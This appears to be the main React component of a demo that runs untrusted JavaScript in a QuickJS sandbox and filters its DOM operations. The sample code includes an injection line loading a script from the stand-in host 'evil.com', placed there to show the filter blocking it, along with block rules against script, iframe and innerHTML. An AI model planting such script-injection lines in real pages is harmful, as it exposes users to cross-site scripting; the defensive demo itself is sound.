import './App.css';
import { useSandbox } from './hooks/useSandbox';
import type { Rule, DOMOperation } from './sandbox';

const defaultCode = `
// This runs inside the QuickJS sandbox

const header = document.getElementById('target-header');
if (header) {
  header.textContent = 'Modified by Sandbox!';
  header.style.color = '#ff6b6b';
}

const div = document.createElement('div');
div.textContent = 'I am appended from inside QuickJS!';
div.style.padding = '10px';
div.style.background = '#2c3e50';
div.style.color = 'white';
div.style.marginTop = '10px';
div.style.borderRadius = '8px';

document.body.appendChild(div);

// This will be blocked by our filter
const script = document.createElement('script');
script.src = 'http://evil.com/xss.js';
document.head.appendChild(script);
`;

const filterRules: Rule[] = [
  (op: DOMOperation) => {
    // Block script and iframe creation
    if (op.type === 'call' && op.method === 'createElement') {
      const tag = String(op.args[0])?.toLowerCase();
      if (tag === 'script' || tag === 'iframe') {
        console.warn(`BLOCKED: attempt to create <${tag}>`);
        return false;
      }
    }

    // Block setting innerHTML
    if (op.type === 'set' && op.prop === 'innerHTML') {
      console.warn(`BLOCKED: attempt to set innerHTML`);
      return false;
    }

    // If you wish to dump logs inside React, you can optionally capture the rule execution,
    // though native console behaves better.
    console.log(`ALLOW: ${op.type} on node(${op.nodeId}) - ${'prop' in op ? op.prop : op.method}`);
    return true;
  }
];

function App() {
  const {
    code,
    setCode,
    logs,
    runCode,
    qjsReady,
    resetPage,
    resetCode
  } = useSandbox(defaultCode);

  return (
    <div className="container">
      <div className="split left-panel">
        <h2>Unstrusted Code Editor</h2>
        <textarea
          value={code}
          style={{ color: 'black' }}
          onChange={e => setCode(e.target.value)}
          spellCheck="false"
        />
        <div style={{ display: 'flex', gap: '10px' }}>
          <button onClick={() => runCode(filterRules)} disabled={!qjsReady}>
            Run Sandboxed Code
          </button>
          <button onClick={resetPage} style={{ backgroundColor: '#fa5252' }}>
            Reset Page
          </button>
          <button onClick={resetCode} style={{ backgroundColor: '#868e96' }}>
            Reset Code
          </button>
        </div>

        <div className="logs-container">
          <h3>Sandbox Logs Engine</h3>
          <div className="logs">
            {logs.map((log, i) => (
              <div key={i}>{log}</div>
            ))}
          </div>
        </div>
      </div>

      <div className="split right-panel">
        <h2 id="target-header">Host Context (Real DOM)</h2>
        <p>This is the real DOM of the React application.</p>
        <p>
          The sandbox has access to it via the proxy bridge.
          It will search for <code>#target-header</code> and modify it,
          and append a new div to the body.
        </p>
      </div>
    </div>
  );
}

export default App;
